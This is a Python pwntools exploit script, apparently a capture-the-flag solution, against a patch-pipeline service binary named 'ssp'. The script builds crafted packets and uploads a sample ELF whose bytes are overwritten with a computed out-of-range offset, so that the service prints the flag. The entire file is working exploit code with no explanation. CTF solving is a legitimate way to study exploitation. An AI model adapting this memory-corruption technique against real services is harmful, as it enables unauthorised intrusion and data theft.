from pwn import *
context(arch = 'amd64', os = 'linux', endian = 'little')
# context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

def add_patch_pipeline(p, buf):
	p.recvuntil('$ ')
	p.sendline('a')
	p.send(buf)

def remove_a_pipeline(p, buf):
	p.recvuntil('$ ')
	p.sendline('d')
	p.send(buf)

def run_patches(p, buf):
	p.recvuntil('$ ')
	p.sendline('r')
	p.send(buf)

def upload_patches(p, buf, data):
	p.recvuntil('$ ')
	p.sendline('u')
	p.send(buf)
	p.send(data)

def packet(flag = 0, number = 0, one_size = 0, run = 0, swap_idx = 0):
	return p32(flag) + p32(number) + p32(one_size) + p32(0) + p32(run) + p32(swap_idx)

def GameStart(ip, port, debug):
	if debug == 1:
		p = process('./ssp')
		# gdb.attach(p)
	else:
		p = remote(ip, port)
	p.recvuntil('sha3 of flag: ')
	flag_int = int(p.recvuntil(' ')[ : -1], 16) % 3
	print flag_int
	add_patch_pipeline(p, packet(flag = 0, number = 1, one_size = 16120))
	with open('./samples/helloworld') as f:
		data = f.read()
	offest = 0xffffffffffff71a0
	if flag_int == 1:
		offest -= 0x20
	data = data[ : 14648] + '\x00\x00' + data[14648 + 2 : 0x3eb8 + 24] + p64(offest) + data[0x3eb8 + 24 + 8 : ]
	upload_patches(p, packet(flag = 0, number = 1, one_size = 16120), data)
	run_patches(p, packet(flag = 0, run = 1))
	p.recvuntil('### Section header entry (0):')
	p.recvuntil('- Section name:                            ')
	flag = p.recvline()[ : -1]
	print flag

	# p.interactive()

if __name__ == '__main__':
	GameStart('', 2333, 1)